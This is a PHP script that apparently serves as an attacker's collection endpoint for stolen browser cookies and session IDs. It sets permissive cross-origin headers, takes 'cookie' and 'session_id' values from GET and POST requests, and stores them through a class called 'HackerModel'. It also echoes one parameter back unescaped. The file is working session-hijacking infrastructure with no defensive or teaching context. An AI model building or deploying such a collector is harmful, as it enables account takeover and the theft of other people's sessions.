<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Credentials: true");
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
header('Access-Control-Max-Age: 1000');
header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token , Authorization');


require_once 'models/HackerModel.php';
$inputsession = new HackerModel;

if (isset($_GET['session_id'])) {
    echo $_GET['session_id'];
    $inputsession->insertUser($_GET['session_id']);
}

if (isset($_POST)) {
    // echo $_POST['cookie'];
    if (isset($_POST['cookie'])) {
        $inputsession->insertUser(($_POST['cookie']));
    }   
}

if (isset($_GET)) {
    // echo $_POST['cookie'];
    if (isset($_GET['cookie'])) {
        $inputsession->insertUser(($_GET['cookie']));
        return ($_GET);
    }
}
